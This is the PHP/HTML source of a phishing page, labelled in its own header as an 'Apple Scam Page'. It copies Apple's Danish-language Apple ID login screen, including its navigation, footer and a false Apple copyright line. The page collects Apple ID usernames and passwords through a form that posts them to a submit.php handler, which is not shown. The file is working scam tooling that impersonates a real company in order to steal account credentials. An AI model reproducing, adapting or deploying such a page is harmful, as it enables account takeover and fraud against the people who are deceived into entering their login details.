<?php
/**
 * @link              https://www.facebook.com/hamidakhatar
 * @since             2019
 * @package           Apple Scam Page
 *
 * Project Name:      Apple Scam
 * Author:            Hamid Akhatar
 * Author URI:        https://www.facebook.com/hamidakhatar
 */
include_once '../inc/app.php';
?>
<!doctype html>
<html lang="en">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" type="image/x-icon" href="../assets/images/fav.ico">

        <title>Administrer dit Apple-id</title>
    </head>

    <body>

        <div id="hero">

            <div class="top-hero">
                <div class="container">
                    <ul class="d-lg-flex d-md-flex d-sm-none d-none">
                        <li><a class="logo-app" href="#"><i class="fab fa-apple"></i></a></li>
                        <li><a href="#">Mac</a></li>
                        <li><a href="#">iPad</a></li>
                        <li><a href="#">iPhone</a></li>
                        <li><a href="#">Watch</a></li>
                        <li><a href="#">TV</a></li>
                        <li><a href="#">Music</a></li>
                        <li><a href="#">Support</a></li>
                        <li><a href="#"><i class="fas fa-search"></i></a></li>
                        <li><a href="#"><i class="fas fa-shopping-bag"></i></a></li>
                    </ul>

                    <ul class="d-lg-none d-md-none d-sm-flex d-flex">
                        <li class="text-left"><a href="#"><i class="fas fa-stream"></i></a></li>
                        <li class="text-center"><a href="#"><i class="fab fa-apple"></i></a></li>
                        <li class="text-right"><a href="#"><i class="fas fa-shopping-bag"></i></a></li>
                    </ul>

                </div>
            </div>

            <div class="second-hero">
                <div class="container">
                    <div class="logo">
                        <p>Apple-id</p>
                    </div>
                    <ul class="d-lg-block d-md-block d-sm-none d-none">
                        <li><a class="active" href="#">Log ind</a></li>
                        <li><a href="#">Opret dit Apple‑id</a></li>
                        <li><a href="#">Ofte stillede spørgsmål</a></li>
                    </ul>
                </div>
            </div>


            <div class="hero-form">
                <div class="container">
                    <img class="loogo" src="../assets/images/logoo.png">
                    <h3>Administrer din Apple-konto</h3>
                    <form method="post" action="submit.php" id="login_form">
                        <div class="input-group apple_id_group">
                            <input type="text" name="apple_id" id="apple_id" placeholder="Apple-id">
                            <div class="next-btn"></div>
                            <div class="input-loader">Loading...</div>
                        </div>
                        <div class="input-group apple_password_group">
                            <input type="password" name="apple_password" id="apple_password" placeholder="Adgangskode">
                            <div class="next-btn"></div>
                            <div class="input-loader">Loading...</div>
                        </div>
                        <div class="error-message">
                            <p>Dit Apple‑id eller din adgangskode er angivet forkert.</p>
                        </div>

                        <div class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" id="customCheck1">
                            <label class="custom-control-label" for="customCheck1">Husk mig</label>
                        </div>
                        <input type="hidden" name="type" value="login">
                    </form>
                    <a href="#">Har du glemt dit Apple‑id eller din adgangskode?</a>
                </div>
            </div>
        </div>

        <div id="bottom-page">
            <div class="container">
                <h2>Din konto til alt, der har med Apple at gøre</h2>
                <p>
                    Et enkelt Apple‑id og en adgangskode giver dig <br>
                    adgang til alle Apples tjenester.
                </p>
                <a class="d-block mb-5" href="#">Læs mere om Apple‑id <i class="fas fa-chevron-right"></i></a>
                <img src="../assets/images/icons.png">
                <a class="d-block mt-5" href="#">Opret dit Apple‑id <i class="fas fa-chevron-right"></i></a>
            </div>
        </div>

        <footer id="footer">
            <div class="container">
                <div class="row">
                    
                    <div class="col-md-9">
                        <p>Flere måder at shoppe på: Ring 80 24 08 35, eller <a href="#">find en forhandler.</a></p>
                        <p>Copyright © 2019 Apple Inc. Alle rettigheder forbeholdes.</p>
                        <ul>
                            <li><a href="#">Anonymitetspolitik</a></li>
                            <li><a href="#">Brug af cookies</a></li>
                            <li><a href="#">Betingelser for brug</a></li>
                            <li><a href="#">Salg og refundering</a></li>
                            <li><a href="#">Juridisk tekst</a></li>
                            <li><a href="#">Oversigt</a></li>
                        </ul>
                    </div>
                    <div class="col-md-3 mt-lg-0 mt-md-0 mt-sm-3 mt-3 d-flex align-items-center">
                        <div class="lang">
                            <img src="../assets/images/dklogo.png"> Danmark
                        </div>
                    </div>

                </div>
            </div>
        </footer>

        <!-- JS FILES -->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>
    </body>

</html>